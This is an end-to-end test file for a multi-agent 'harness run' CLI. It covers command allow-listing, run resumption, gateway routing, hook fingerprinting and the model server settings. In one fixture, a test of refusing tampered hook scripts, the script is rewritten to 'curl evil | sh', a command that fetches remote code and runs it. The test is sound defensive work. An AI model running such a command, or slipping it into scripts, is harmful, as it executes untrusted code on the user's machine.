// @vitest-environment node
/**
 * harness run end to end: the built bundle (npm run build:cli) through
 * cli/harness.mjs, against the fake harness-core with canned model replies.
 */
import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { beforeAll, describe, expect, it } from "vitest";
import { stringify } from "yaml";
import { hookFingerprint } from "../../fixtures/hookFingerprint.mjs";

const root = resolve(__dirname, "../../..");
const fakeCore = join(root, "tests", "fixtures", "fake-core.mjs");

beforeAll(() => {
  const vite = join(root, "node_modules", "vite", "bin", "vite.js");
  const build = spawnSync(process.execPath, [vite, "build", "--config", "vite.cli.config.ts", "--logLevel", "error"],
    { cwd: root, encoding: "utf8" });
  expect(build.status, build.stderr).toBe(0);
}, 120_000);

function agent(name: string, role: string, tools: string[] = []) {
  return {
    name, role, model: "qwen2.5-coder:7b", temperature: 0.7, maxTokens: 1024, maxSteps: 3, timeoutSeconds: 60,
    promptSource: { type: "inline", content: `You review and fix code as the ${name}.` }, tools,
    memoryRead: [], memoryWrite: [], tokens: { used: 0, budget: 0 }, status: "idle",
  };
}

/** A workspace with a Coder → Reviewer workflow, and the fake core's scenario. */
function workspace(replies: Record<string, string[]>, extra: Record<string, unknown> = {}): string {
  const dir = mkdtempSync(join(tmpdir(), "harness-run-"));
  writeFileSync(join(dir, "review.harness.yaml"), stringify({
    meta: { name: "Code Review", version: "1.0.0", description: "", projectRoot: "", createdAt: "", updatedAt: "" },
    agents: [agent("Coder", "worker", ["bash"]), agent("Reviewer", "critic")],
    connections: [{ id: "c1", sourceAgentId: "agent-0", targetAgentId: "agent-1" }],
    executionSettings: { maxParallel: 2, timeoutSeconds: 300, retryOnFailure: false, maxRetries: 0 },
    nodePositions: {},
  }));
  writeFileSync(join(dir, "scenario.json"), JSON.stringify({ replies, ...extra }));
  return dir;
}

/** `env` adds to the environment the run is given: the options `harness run` also reads from it start out unset. */
function harnessRun(dir: string, args: string[], env: Record<string, string> = {}) {
  const result = spawnSync(process.execPath, [
    join(root, "cli", "harness.mjs"), "run", join(dir, "review.harness.yaml"),
    "--workspace", dir, "--core", fakeCore, ...args,
  ], {
    cwd: dir, encoding: "utf8",
    env: {
      ...process.env, FAKE_CORE_SCENARIO: join(dir, "scenario.json"), FAKE_CORE_LOG: join(dir, "core.log"),
      OPENAI_API_KEY: "", ANTHROPIC_API_KEY: "", LLM_PROVIDER: "",
      HARNESS_OLLAMA_NUM_CTX: "", HARNESS_REQUEST_TIMEOUT_SECS: "", HARNESS_CUSTOM_BASE_URL: "",
      HARNESS_CUSTOM_MODEL: "", HARNESS_CUSTOM_API_KEY: "",
      ...env,
    },
  });
  const log = join(dir, "core.log");
  const requests = existsSync(log)
    ? readFileSync(log, "utf8").trim().split("\n").map((line) => JSON.parse(line) as { cmd: string; args: Record<string, unknown> })
    : [];
  return { ...result, requests };
}

const bashCall = '<tool_call>{"name":"bash","args":{"command":"npm test"}}</tool_call>';

// Each test runs the CLI one to four times in a row, synchronously: under a full
// parallel suite that can pass vitest's 5 s default, which fails a sync test too.
describe("harness run", { timeout: 60_000 }, () => {
  it("runs a workflow, printing each agent and a summary, and exits 0", () => {
    const run = harnessRun(workspace({ Coder: ["wrote the fix"], Reviewer: ["Looks good."] }), ["--task", "Fix the bug"]);

    expect(run.status, run.stderr).toBe(0);
    // The app's warning is about its approval dialog; harness run has --allow-command instead.
    expect(run.stderr).toContain('"Coder" can run shell commands (bash): only the commands passed with --allow-command run.');
    expect(run.stdout).toContain("▶ Coder started (qwen2.5-coder:7b via ollama)");
    expect(run.stdout).toMatch(/✓ Coder done \(\d+\.\d s\)/);
    expect(run.stdout).toContain("Final output — Reviewer:\n  Looks good.");
    const coder = run.requests.find((r) => r.cmd === "call_ollama_api" && String(r.args.system).startsWith("You are Coder"));
    expect(coder?.args.userMessage).toContain("USER TASK:\nFix the bug");
  });

  it("prints only JSON events with --json", () => {
    const run = harnessRun(workspace({ Coder: ["done"], Reviewer: ["fine"] }), ["--task", "t", "--json"]);

    expect(run.status, run.stderr).toBe(0);
    const events = run.stdout.trim().split("\n").map((line) => JSON.parse(line) as Record<string, unknown>);
    // Only the provider preflight's audit entries come before the run exists.
    expect(events.find((e) => e.type !== "audit")?.type).toBe("run_started");
    expect(events.filter((e) => e.type === "node_finished").map((e) => [e.agent, e.status]))
      .toEqual([["Coder", "done"], ["Reviewer", "done"]]);
    expect(events.at(-1)).toMatchObject({ type: "run_finished", status: "done", outputs: { "agent-1": "fine" } });
  });

  it("saves each agent's usage in the run record and prints nothing more for it", () => {
    const usage = { Coder: { input: 100, output: 10 }, Reviewer: { input: 200, output: 20 } };
    const replies = { Coder: ["wrote the fix"], Reviewer: ["Looks good."] };
    const counted = workspace(replies, { usage });
    const bare = workspace(replies);
    // What differs between two runs anyway, the run id and the times, is made alike.
    const alike = (text: string) => text.replace(/run-\d+/g, "run-ID").replace(/\d+\.\d s/g, "N s");
    const recordOf = (dir: string) => {
      const runs = join(dir, ".harness", "runs");
      return JSON.parse(readFileSync(join(runs, readdirSync(runs)[0], "run.json"), "utf8")) as {
        version: number; nodes: Record<string, { usage?: unknown }>;
      };
    };

    const withCounts = harnessRun(counted, ["--task", "Fix the bug"]);
    const without = harnessRun(bare, ["--task", "Fix the bug"]);

    expect(withCounts.status, withCounts.stderr).toBe(0);
    expect(without.status, without.stderr).toBe(0);
    // The same lines, whether or not the providers sent counts: no new line for them.
    expect(alike(withCounts.stdout)).toBe(alike(without.stdout));
    expect(alike(withCounts.stderr)).toBe(alike(without.stderr));
    expect(withCounts.stdout).not.toMatch(/usage/i);
    // The record has them. It stays version 1.
    expect(recordOf(counted)).toMatchObject({
      version: 1,
      nodes: {
        "agent-0": { usage: { input: 100, output: 10, calls: 1, callsWithoutUsage: 0 } },
        "agent-1": { usage: { input: 200, output: 20, calls: 1, callsWithoutUsage: 0 } },
      },
    });
    // A harness-core that answers a bare string (an older one) sends no counts: its calls are calls without usage.
    expect(recordOf(bare).nodes["agent-0"].usage).toEqual({ input: 0, output: 0, calls: 1, callsWithoutUsage: 1 });

    // And with --json: the events carry no usage either.
    const json = harnessRun(workspace(replies, { usage }), ["--task", "Fix the bug", "--json"]);
    expect(json.status, json.stderr).toBe(0);
    expect(json.stdout).not.toContain('"usage"');
  });

  it("denies an agent's command unless it was allowed exactly with --allow-command", () => {
    const replies = { Coder: [bashCall, "tested"], Reviewer: ["ok"] };

    const denied = harnessRun(workspace(replies), ["--task", "t"]);
    expect(denied.status, denied.stderr).toBe(0);
    expect(denied.stdout).toContain("$ Coder: command denied (not in --allow-command): npm test");
    expect(denied.requests.some((r) => r.cmd === "execute_command")).toBe(false);

    const allowed = harnessRun(workspace(replies), ["--task", "t", "--allow-command", "npm test"]);
    expect(allowed.status, allowed.stderr).toBe(0);
    expect(allowed.stdout).toMatch(/\$ Coder ran: npm test \(allowed by --allow-command; exit 0/);
    expect(allowed.requests.find((r) => r.cmd === "execute_command")?.args)
      .toMatchObject({ command: "npm test", consentGranted: true });
  });

  it("exits 1 when an agent fails", () => {
    const run = harnessRun(workspace({ Coder: ["done"], Reviewer: ["ERROR: model crashed"] }), ["--task", "t"]);

    expect(run.status).toBe(1);
    expect(run.stdout).toContain("✗ Reviewer failed: model crashed");
  });

  it("exits 2 for bad usage or an invalid workflow, without starting harness-core", () => {
    const dir = workspace({});
    expect(harnessRun(dir, []).status).toBe(2); // no task

    writeFileSync(join(dir, "review.harness.yaml"), "meta:\n  name: broken\n");
    const invalid = harnessRun(dir, ["--task", "t"]);
    expect(invalid.status).toBe(2);
    expect(invalid.stderr).toContain("is not a valid workflow");
    expect(invalid.requests).toEqual([]);
  });

  const lastEvent = (stdout: string) => JSON.parse(stdout.trim().split("\n").at(-1)!) as Record<string, string>;
  const callsOf = (agent: string, requests: Array<{ cmd: string; args: Record<string, unknown> }>) =>
    requests.filter((r) => r.cmd === "call_ollama_api" && String(r.args.system).startsWith(`You are ${agent},`));

  it("saves each run, and --resume reuses the agents that finished unchanged", () => {
    const dir = workspace({ Coder: ["wrote the fix"], Reviewer: ["ERROR: model crashed"] });
    const first = harnessRun(dir, ["--task", "Fix the bug", "--json"]);
    expect(first.status).toBe(1);
    const { runId, trace } = lastEvent(first.stdout);
    expect(trace).toBe(`.harness/runs/${runId}/run.json`);

    writeFileSync(join(dir, "scenario.json"), JSON.stringify({ replies: { Coder: ["another fix"], Reviewer: ["Looks good."] } }));
    const second = harnessRun(dir, ["--resume", runId]);

    expect(second.status, second.stderr).toBe(0);
    expect(second.stdout).toContain("↩ Coder: reused from the saved run (unchanged)");
    expect(callsOf("Coder", second.requests)).toHaveLength(callsOf("Coder", first.requests).length);
    expect(callsOf("Reviewer", second.requests).at(-1)?.args.userMessage).toContain("[From: Coder]\nwrote the fix");
    expect(JSON.parse(readFileSync(join(dir, trace), "utf8"))).toMatchObject({ runId, attempts: 2, status: "done" });
  });

  it("drops the branch a gateway no longer chooses when a revision re-runs it, and leaves nothing of it in the saved run", () => {
    // Draft → Gate → (Fast | Slow) → Review, and Review sends Draft back. Gate chooses Fast, then Slow.
    const dir = workspace({
      Draft: ["draft one", "draft two"], Gate: ['{"route":"fast"}', '{"route":"slow"}'],
      Fast: ["fast answer"], Slow: ["slow answer"], Review: ["REVISE: try the slow way", "PASS"],
    });
    const link = (id: string, from: number, to: number, extra: Record<string, unknown> = {}) =>
      ({ id, sourceAgentId: `agent-${from}`, targetAgentId: `agent-${to}`, ...extra });
    writeFileSync(join(dir, "review.harness.yaml"), stringify({
      meta: { name: "Gateway switch", version: "1.0.0", description: "", projectRoot: "", createdAt: "", updatedAt: "" },
      agents: [agent("Draft", "worker"), agent("Gate", "gateway"), agent("Fast", "worker"), agent("Slow", "worker"), agent("Review", "critic")],
      connections: [
        link("c0", 0, 1), link("c1", 1, 2, { label: "fast" }), link("c2", 1, 3, { label: "slow" }),
        link("c3", 2, 4), link("c4", 3, 4), link("c5", 4, 0, { label: "revise", edgeKind: "feedback" }),
      ],
      executionSettings: { maxParallel: 2, timeoutSeconds: 300, retryOnFailure: false, maxRetries: 0 },
      nodePositions: {},
    }));

    const run = harnessRun(dir, ["--task", "go", "--json"]);

    expect(run.status, run.stderr).toBe(0);
    const events = run.stdout.trim().split("\n").map((line) => JSON.parse(line) as Record<string, unknown>);
    const finished = (agentName: string) => events
      .filter((e) => e.type === "node_finished" && e.agent === agentName).map((e) => [e.status, e.output]);
    expect(finished("Fast")).toEqual([["done", "fast answer"], ["skipped", undefined]]); // finished, then taken back
    expect(finished("Slow")).toEqual([["skipped", undefined], ["done", "slow answer"]]); // skipped, then chosen
    // The drop is a revision's doing: `harness run` reports it as a revision event, in text mode as a line of its own.
    expect(events.filter((e) => e.type === "revision").map((e) => e.details)).toContain(
      "↺ Fast skipped: a gateway now routes around it, so its earlier result is dropped");
    // The reviewer read Fast the first time and Slow, not Fast, the second.
    const reviews = callsOf("Review", run.requests).map((r) => String(r.args.userMessage));
    expect(reviews[0]).toContain("[From: Fast]\nfast answer");
    expect(reviews[1]).toContain("[From: Slow]\nslow answer");
    expect(reviews[1]).not.toContain("fast answer");
    expect(callsOf("Fast", run.requests)).toHaveLength(1);
    // The saved run has no output of Fast, and only the route Gate ended with.
    const final = events.at(-1) as Record<string, unknown>;
    expect(final).toMatchObject({ type: "run_finished", status: "done", outputs: { "agent-4": "PASS" } });
    const record = JSON.parse(readFileSync(join(dir, String(final.trace)), "utf8")) as {
      outputs: Record<string, string>; nodes: Record<string, { status: string; output?: string }>; gatewayRoutes: Record<string, string>;
    };
    expect(Object.keys(record.outputs).sort()).toEqual(["agent-0", "agent-1", "agent-3", "agent-4"]);
    expect(record.nodes["agent-2"]).toMatchObject({ status: "skipped" });
    expect(record.nodes["agent-2"].output).toBeUndefined();
    expect(record.gatewayRoutes).toEqual({ "agent-1": "slow" });
  });

  describe("a Hook node that runs without asking", () => {
    /** Mutator → Gate: two hooks with a script in the workspace, neither needing consent. The fake core's scenario is `scenario`. */
    function hookWorkspace(scenario: Record<string, unknown> = {}): string {
      const dir = workspace({}, scenario);
      mkdirSync(join(dir, "scripts"));
      writeFileSync(join(dir, "scripts", "mutator.sh"), "echo mutate\n");
      writeFileSync(join(dir, "scripts", "gate.sh"), "echo gate\n");
      const hook = (name: string, script: string) =>
        ({ ...agent(name, "hook"), preHook: { path: `scripts/${script}`, requireConsent: false } });
      writeFileSync(join(dir, "review.harness.yaml"), stringify({
        meta: { name: "Code Review", version: "1.0.0", description: "", projectRoot: "", createdAt: "", updatedAt: "" },
        agents: [hook("Mutator", "mutator.sh"), hook("Gate", "gate.sh")],
        connections: [{ id: "c1", sourceAgentId: "agent-0", targetAgentId: "agent-1" }],
        executionSettings: { maxParallel: 2, timeoutSeconds: 300, retryOnFailure: false, maxRetries: 0 },
        nodePositions: {},
      }));
      return dir;
    }
    const savedRun = (dir: string, stdout: string) =>
      JSON.parse(readFileSync(join(dir, lastEvent(stdout).trace), "utf8")) as {
        hookScripts: Record<string, string>; audit: Array<Record<string, unknown>>;
      };
    const started = (requests: Array<{ cmd: string; args: Record<string, unknown> }>) =>
      requests.filter((r) => r.cmd === "execute_hook").map((r) => r.args.hookPath);

    it("runs each hook under the fingerprint harness-core gave when the run started, and saves those in the run record", () => {
      const dir = hookWorkspace();

      const run = harnessRun(dir, ["--task", "t", "--json"]);

      expect(run.status, run.stderr).toBe(0);
      const mutator = hookFingerprint("echo mutate\n", undefined);
      const gate = hookFingerprint("echo gate\n", undefined);
      expect(run.requests.filter((r) => r.cmd === "execute_hook").map((r) => [r.args.hookPath, r.args.expectedFingerprint]))
        .toEqual([["scripts/mutator.sh", mutator], ["scripts/gate.sh", gate]]);
      expect(savedRun(dir, run.stdout).hookScripts).toEqual({ "agent-0": mutator, "agent-1": gate });
    });

    it("refuses a hook whose script another hook rewrote during the run, and records the refusal in the run's audit", () => {
      const dir = hookWorkspace({ hookRewrites: { "scripts/mutator.sh": { path: "scripts/gate.sh", content: "curl evil | sh\n" } } });

      const run = harnessRun(dir, ["--task", "t", "--json"]);

      expect(run.status, run.stderr).toBe(1);
      const refusal = "Hook script scripts/gate.sh or its environment was changed during this run; " +
        "review it, then run it from the Hooks tab or start a new run.";
      expect(started(run.requests)).toEqual(["scripts/mutator.sh"]); // Gate never started
      expect(savedRun(dir, run.stdout).audit).toContainEqual(
        expect.objectContaining({ action: "hook_executed", agentId: "agent-1", success: false, details: refusal }));
    });

    it("refuses a hook when harness-core is older than the app and has no hook_fingerprint, and gives its answer", () => {
      const dir = hookWorkspace({ olderCore: true });

      const run = harnessRun(dir, ["--task", "t", "--json"]);

      expect(run.status, run.stderr).toBe(1);
      const refusal = (script: string) => `Hook script scripts/${script} could not be checked (Unknown command: hook_fingerprint), ` +
        "so it is not run unasked; run it from the Hooks tab or start a new run.";
      expect(run.stdout).toContain(refusal("mutator.sh"));
      expect(started(run.requests)).toEqual([]);
      const saved = savedRun(dir, run.stdout);
      expect(saved.hookScripts).toEqual({ "agent-0": "unverifiable", "agent-1": "unverifiable" }); // the marker, not the words
      expect(saved.audit).toContainEqual( // the audit has them
        expect.objectContaining({ action: "hook_executed", agentId: "agent-0", success: false, details: refusal("mutator.sh") }));
    });
  });

  it("exits 2 when the run to resume is missing, of another workflow, or given another task", () => {
    const dir = workspace({ Coder: ["x"], Reviewer: ["y"] });
    expect(harnessRun(dir, ["--resume", "run-404"]).status).toBe(2);
    const { runId } = lastEvent(harnessRun(dir, ["--task", "t", "--json"]).stdout);

    expect(harnessRun(dir, ["--resume", runId, "--task", "another task"]).status).toBe(2);
    const yaml = readFileSync(join(dir, "review.harness.yaml"), "utf8");
    writeFileSync(join(dir, "review.harness.yaml"), yaml.replace("name: Code Review", "name: Other Workflow"));
    expect(harnessRun(dir, ["--resume", runId]).status).toBe(2);
  });

  describe("the local model server options", () => {
    type Request = { cmd: string; args: Record<string, unknown> };
    /** The arguments of the model calls (the native turn and the text call) of the agent named `agent`. */
    const modelCalls = (requests: Request[], agent: string) => requests.filter((r) =>
      ["chat_turn", "call_ollama_api", "call_openai_api"].includes(r.cmd) && String(r.args.system).startsWith(`You are ${agent},`));
    const savedProvider = (dir: string, stdout: string) =>
      (JSON.parse(readFileSync(join(dir, lastEvent(stdout).trace), "utf8")) as { provider: Record<string, unknown> }).provider;

    it("sends Ollama a 16384-token context window and a 600 s timeout, and records the window", () => {
      const dir = workspace({ Coder: ["wrote the fix"], Reviewer: ["Looks good."] });

      const run = harnessRun(dir, ["--task", "t", "--json"]);

      expect(run.status, run.stderr).toBe(0);
      const calls = [...modelCalls(run.requests, "Coder"), ...modelCalls(run.requests, "Reviewer")];
      expect(calls.map((c) => c.cmd).sort()).toEqual(["call_ollama_api", "call_ollama_api", "chat_turn"]);
      for (const call of calls) expect(call.args).toMatchObject({ numCtx: 16384, requestTimeoutSecs: 600 });
      // Exactly what the record holds of the run's provider: the window is in it, the timeout is not.
      expect(savedProvider(dir, run.stdout)).toEqual({
        llmProvider: "auto", ollamaBaseUrl: "", ollamaModel: "", customApiUrl: "", customApiModel: "", ollamaNumCtx: 16384,
      });
    });

    it("takes the window and the timeout from --num-ctx and --request-timeout, and from the environment when no flag is given", () => {
      const flags = harnessRun(workspace({}), ["--task", "t", "--num-ctx", "4096", "--request-timeout", "1800"]);
      expect(flags.status, flags.stderr).toBe(0);
      for (const call of modelCalls(flags.requests, "Reviewer")) {
        expect(call.args).toMatchObject({ numCtx: 4096, requestTimeoutSecs: 1800 });
      }

      const env = { HARNESS_OLLAMA_NUM_CTX: "8192", HARNESS_REQUEST_TIMEOUT_SECS: "900" };
      const fromEnv = harnessRun(workspace({}), ["--task", "t"], env);
      expect(fromEnv.status, fromEnv.stderr).toBe(0);
      for (const call of modelCalls(fromEnv.requests, "Reviewer")) {
        expect(call.args).toMatchObject({ numCtx: 8192, requestTimeoutSecs: 900 });
      }

      const both = harnessRun(workspace({}), ["--task", "t", "--num-ctx", "0", "--request-timeout", "60", "--json"], env);
      expect(both.status, both.stderr).toBe(0);
      for (const call of modelCalls(both.requests, "Reviewer")) {
        expect(call.args).toMatchObject({ numCtx: 0, requestTimeoutSecs: 60 });
      }
    });

    it("records 0, and exits 2 for a value that is not a whole number, before harness-core is started", () => {
      const dir = workspace({});
      const zero = harnessRun(dir, ["--task", "t", "--json"], { HARNESS_OLLAMA_NUM_CTX: "0" });
      expect(savedProvider(dir, zero.stdout)).toMatchObject({ ollamaNumCtx: 0 });

      const badFlag = harnessRun(workspace({}), ["--task", "t", "--num-ctx", "lots"]);
      expect(badFlag.status).toBe(2);
      expect(badFlag.stderr).toContain("--num-ctx must be a whole number of tokens, 0 or more");
      const badEnv = harnessRun(workspace({}), ["--task", "t"], { HARNESS_REQUEST_TIMEOUT_SECS: "5" });
      expect(badEnv.status).toBe(2);
      expect(badEnv.stderr).toContain("HARNESS_REQUEST_TIMEOUT_SECS must be a whole number of seconds from 30 to 86400");
      expect(badEnv.requests).toEqual([]);
    });

    it("warns on stderr, as the run starts an agent, that its prompt does not fit the context window", () => {
      const run = harnessRun(workspace({ Coder: ["done"], Reviewer: ["fine"] }), ["--task", "x".repeat(10_000), "--num-ctx", "2048"]);

      expect(run.status, run.stderr).toBe(0);
      const warnings = run.stderr.split("\n").filter((line) => line.startsWith("warning: Coder:"));
      expect(warnings).toHaveLength(1);
      // (The numbers carry the locale's thousands separator, whatever it is.)
      expect(warnings[0]).toMatch(/^warning: Coder: its prompt is about [^ ]+ tokens and it may reply with up to 1\D?024 tokens, but Ollama's context window is 2\D?048 tokens, /);
      expect(warnings[0]).toContain("Raise the context window (Settings → Ollama context window; harness run: --num-ctx).");
      expect(run.stderr).not.toContain("warning: ⚠"); // one marker, not two
      expect(run.stdout).not.toContain("context window"); // stdout is the run's own lines
    });

    it("says it as a JSON event with --json, and keeps stderr free of it", () => {
      const run = harnessRun(workspace({}), ["--task", "x".repeat(10_000), "--num-ctx", "2048", "--json"]);

      const events = run.stdout.trim().split("\n").map((line) => JSON.parse(line) as Record<string, unknown>);
      const warned = events.filter((e) => String(e.details).includes("context window"));
      expect(warned).toMatchObject([{ type: "audit", nodeId: "agent-0", success: true, warning: true }]);
      expect(run.stderr).not.toContain("context window");
    });

    it("runs on a Custom endpoint given by the environment alone, with no flag", () => {
      const dir = workspace({ Coder: ["wrote the fix"], Reviewer: ["Looks good."] });

      const run = harnessRun(dir, ["--task", "t", "--json"], {
        LLM_PROVIDER: "openai-compatible", HARNESS_CUSTOM_BASE_URL: "http://localhost:8080/v1",
        HARNESS_CUSTOM_MODEL: "my-local-model", HARNESS_CUSTOM_API_KEY: "local-key",
      });

      expect(run.status, run.stderr).toBe(0);
      const probe = run.requests.find((r) => r.cmd === "check_provider_health");
      expect(probe?.args).toMatchObject({
        provider: "openai-compatible", baseUrl: "http://localhost:8080/v1", model: "my-local-model", apiKey: "local-key",
      });
      const calls = run.requests.filter((r) => r.cmd === "call_openai_api");
      expect(calls).toHaveLength(2);
      for (const call of calls) {
        expect(call.args).toMatchObject({ baseUrl: "http://localhost:8080/v1", model: "my-local-model", requestTimeoutSecs: 600 });
        expect(call.args).not.toHaveProperty("numCtx");
      }
      expect(JSON.stringify(run.requests)).not.toContain("gpt-4o-mini");
      expect(savedProvider(dir, run.stdout)).toMatchObject({
        customApiUrl: "http://localhost:8080/v1", customApiModel: "my-local-model",
      });
    });

    it("takes --provider openai-compatible with only the variable for the URL, and the flags win over the variables", () => {
      const env = { HARNESS_CUSTOM_BASE_URL: "http://from-env/v1", HARNESS_CUSTOM_MODEL: "env-model" };

      const fromEnv = harnessRun(workspace({}), ["--task", "t", "--provider", "openai-compatible"], env);
      expect(fromEnv.status, fromEnv.stderr).toBe(0);
      expect(fromEnv.requests.find((r) => r.cmd === "check_provider_health")?.args)
        .toMatchObject({ baseUrl: "http://from-env/v1", model: "env-model" });

      const flags = harnessRun(workspace({}),
        ["--task", "t", "--provider", "openai-compatible", "--base-url", "http://from-flag/v1", "--model", "flag-model"], env);
      expect(flags.status, flags.stderr).toBe(0);
      expect(flags.requests.find((r) => r.cmd === "check_provider_health")?.args)
        .toMatchObject({ baseUrl: "http://from-flag/v1", model: "flag-model" });
      expect(flags.requests.find((r) => r.cmd === "call_openai_api")?.args).toMatchObject({ model: "flag-model" });
    });

    it("probes, and sends each agent, the agent's own model when no model was given for the Custom endpoint", () => {
      const run = harnessRun(workspace({}), ["--task", "t", "--provider", "openai-compatible", "--base-url", "http://llm/v1"]);

      expect(run.status, run.stderr).toBe(0);
      // The workflow's agents are on qwen2.5-coder:7b; nothing of ours is asked of the server.
      expect(run.requests.find((r) => r.cmd === "check_provider_health")?.args).toMatchObject({ model: "qwen2.5-coder:7b" });
      for (const call of run.requests.filter((r) => r.cmd === "call_openai_api")) {
        expect(call.args.model).toBe("qwen2.5-coder:7b");
      }
    });

    it("still fails for LLM_PROVIDER=openai-compatible with no URL from a flag or the environment", () => {
      const run = harnessRun(workspace({}), ["--task", "t"], { LLM_PROVIDER: "openai-compatible" });

      expect(run.status).toBe(3);
      expect(run.stderr).toContain("Custom endpoint URL is not configured");
    });
  });

  it("exits 3 when harness-core is missing or the provider preflight fails", () => {
    const dir = workspace({}, { healthFails: true });

    const missing = harnessRun(dir, ["--task", "t", "--core", join(dir, "no-such-core")]);
    expect(missing.status).toBe(3);
    expect(missing.stderr).toContain("harness-core not found");

    const preflight = harnessRun(dir, ["--task", "t"]);
    expect(preflight.status).toBe(3);
    expect(preflight.stderr).toContain("Ollama is not running");
  });
});
